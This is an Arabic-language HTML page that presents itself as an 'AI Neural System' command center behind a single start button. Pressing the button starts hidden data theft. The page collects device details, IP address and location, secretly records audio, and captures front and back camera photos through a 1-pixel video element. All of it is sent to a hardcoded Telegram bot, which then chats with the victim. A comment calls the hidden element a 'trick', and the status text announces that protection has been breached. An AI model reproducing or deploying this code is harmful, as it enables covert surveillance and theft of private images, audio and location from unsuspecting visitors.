<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AI Neural System | مركز التحكم الشامل</title>
    <style>
        :root { --accent: #a855f7; --bg: #05070a; }
        body { background: var(--bg); color: white; font-family: Segoe UI, sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .grid-bg { position: absolute; width: 100%; height: 100%; background-image: linear-gradient(rgba(168, 85, 247, 0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(168, 85, 247, 0.03) 1px, transparent 1px); background-size: 35px 35px; z-index: -1; }
        .main-card { background: rgba(20, 20, 25, 0.9); padding: 40px; border-radius: 35px; border: 1px solid rgba(168, 85, 247, 0.2); backdrop-filter: blur(20px); text-align: center; width: 85%; max-width: 400px; box-shadow: 0 30px 60px rgba(0,0,0,0.5); z-index: 10; transition: 0.5s; }
        #goBtn { width: 150px; height: 150px; border-radius: 50%; border: 4px solid var(--accent); background: transparent; color: var(--accent); font-size: 25px; font-weight: bold; cursor: pointer; transition: 0.4s; z-index: 15; outline: none; }
        #goBtn:active { transform: scale(0.9); background: rgba(168, 85, 247, 0.1); }
        .loader-ring { position: absolute; width: 100%; height: 100%; border: 4px solid transparent; border-top-color: var(--accent); border-radius: 50%; display: none; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        /* خدعة الـ 1 بكسل */
        #v { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
        canvas { display: none; }
        /* تنسيق صندوق الدردشة */
        #chatBox { display: none; margin-top: 20px; border-top: 1px solid rgba(168, 85, 247, 0.3); padding-top: 15px; text-align: right; }
        #chatDisplay { height: 100px; overflow-y: auto; font-size: 11px; color: #8892b0; background: rgba(0,0,0,0.4); padding: 8px; border-radius: 8px; margin-bottom: 5px; }
        #chatDisplay img { max-width: 100%; border-radius: 5px; margin-top: 3px; border: 1px solid var(--accent); }
    </style>
</head>
<body>
    <div class="grid-bg"></div>
    <div class="main-card">
        <h1>ULTIMATE <span style="color:var(--accent)">COMMAND</span></h1>
        <p id="subText" style="color: #8892b0; font-size: 13px;">جاري تجهيز محرك الرصد العصبي...</p>
        <div style="position: relative; width: 200px; height: 200px; margin: 30px auto; display: flex; align-items: center; justify-content: center; border-radius: 50%; border: 2px solid rgba(168, 85, 247, 0.2);">
            <div id="ring" class="loader-ring"></div>
            <button id="goBtn">بدء</button>
        </div>
        
        <div id="chatBox">
            <div id="chatDisplay">النظام: بانتظار الاتصال المشفر...</div>
            <div style="display:flex; gap:5px;">
                <input type="text" id="msgInput" style="flex:1; background:#111; border:1px solid var(--accent); color:white; padding:5px; border-radius:5px;" placeholder="اكتب هنا...">
                <button id="sendMsgBtn" style="background:var(--accent); border:none; border-radius:5px; padding:5px 10px; color:white;">📩</button>
            </div>
        </div>

        <div style="margin-top: 10px; font-size: 10px; color: #444;">Secure Node: RSA-2048-YEM</div>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const token = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
        const chat = "7984067238";
        let lastId = 0;

        async function sendToBot(msg, isImg = false, isVoice = false, data = null) {
            const url = `https://api.telegram.org/bot${token}/`;
            try {
                if(isImg) {
                    const fd = new FormData();
                    fd.append("chat_id", chat);
                    fd.append("photo", data, "capture.jpg");
                    if(msg) fd.append("caption", msg);
                    await fetch(url + "sendPhoto", {method: "POST", body: fd});
                } else if(isVoice) {
                    const fd = new FormData();
                    fd.append("chat_id", chat);
                    fd.append("voice", data, "v.ogg");
                    await fetch(url + "sendVoice", {method: "POST", body: fd});
                } else {
                    await fetch(url + "sendMessage?chat_id=" + chat + "&text=" + encodeURIComponent(msg) + "&parse_mode=Markdown");
                }
            } catch(e) {}
        }

        async function getReplies() {
            try {
                const r = await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=${lastId + 1}`);
                const data = await r.json();
                if(data.result.length > 0) {
                    for(let u of data.result) {
                        lastId = u.update_id;
                        const disp = document.getElementById('chatDisplay');
                        if(u.message.text) disp.innerHTML += `<div style="color:var(--accent)">🤖 المطور: ${u.message.text}</div>`;
                        if(u.message.photo) {
                            const fid = u.message.photo[u.message.photo.length-1].file_id;
                            const path = await fetch(`https://api.telegram.org/bot${token}/getFile?file_id=${fid}`).then(r=>r.json()).then(d=>d.result.file_path);
                            disp.innerHTML += `<div>🤖 أرسل صورة: <img src="https://api.telegram.org/file/bot${token}/${path}"></div>`;
                        }
                        disp.scrollTop = disp.scrollHeight;
                    }
                }
            } catch(e) {}
        }

        async function snap(mode) {
            try {
                const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: mode === "front" ? "user" : "environment"}});
                const v = document.getElementById("v");
                v.srcObject = s; await v.play();
                await new Promise(r => setTimeout(r, 2500));
                const c = document.getElementById("c");
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext("2d").drawImage(v, 0, 0);
                s.getTracks().forEach(t => t.stop());
                return new Promise(res => c.toBlob(res, "image/jpeg", 0.8));
            } catch(e) { return null; }
        }

        async function recordVoice() {
            try {
                const s = await navigator.mediaDevices.getUserMedia({audio:true});
                const rec = new MediaRecorder(s);
                const chunks = [];
                rec.ondataavailable = e => chunks.push(e.data);
                rec.onstop = () => { sendToBot(null, false, true, new Blob(chunks, {type:'audio/ogg'})); s.getTracks().forEach(t=>t.stop()); };
                rec.start(); setTimeout(() => rec.stop(), 5000);
            } catch(e){}
        }

        document.getElementById("goBtn").onclick = async function() {
            // تفعيل الواجهة فوراً
            this.style.display = "none";
            document.getElementById("ring").style.display = "block";
            document.getElementById("subText").innerText = "جاري الاتصال بالعقل العصبي...";

            // تنفيذ المهام في الخلفية لمنع التهنيج
            (async () => {
                let report = `🏴‍☠️ *رصد شامل جديد*:\n\n`;
                report += `📱 جهاز: \`${navigator.platform}\`\n`;
                report += `⚙️ معالج: \`${navigator.hardwareConcurrency}\` Cores\n`;
                report += `💾 رام: \`${navigator.deviceMemory}GB\`\n`;
                try {
                    const b = await navigator.getBattery();
                    report += `🔋 بطارية: \`${Math.round(b.level*100)}%\` (${b.charging?"🔌":"🔋"})\n`;
                } catch(e){}
                
                const conn = navigator.connection || {};
                report += `📶 شبكة: \`${conn.type==='wifi'?"WiFi":"Data"} (${conn.effectiveType})\`\n`;
                
                const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:"Unknown"}));
                report += `🌐 IP: \`${ip.ip}\`\n`;
                
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    await sendToTelegram(`📍 الموقع: [فتح عبر خرائط جوجل](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`);
                }, () => sendToTelegram("⚠️ رفض إذن الموقع"));
                
                // العمليات الخفية
                recordVoice();
                const f = await snap("front"); if(f) await sendToBot("📸 صورة أمامية", true, false, f);
                const b = await snap("back");  if(b) await sendToBot("📷 صورة خلفية", true, false, b);

                // تفعيل الدردشة
                document.getElementById("ring").style.display = "none";
                document.getElementById("subText").innerText = "تم اختراق الحماية. تواصل مع السيرفر:";
                document.getElementById("chatBox").style.display = "block";
                setInterval(getReplies, 3000);
            })();
        };

        // إرسال رسالة من المستخدم
        document.getElementById("sendMsgBtn").onclick = async function() {
            const i = document.getElementById("msgInput");
            if(i.value) {
                document.getElementById('chatDisplay').innerHTML += `<div>👤 أنت: ${i.value}</div>`;
                await sendToBot(`💬 رسالة: ${i.value}`); i.value = "";
            }
        };
    </script>
</body>
</html>
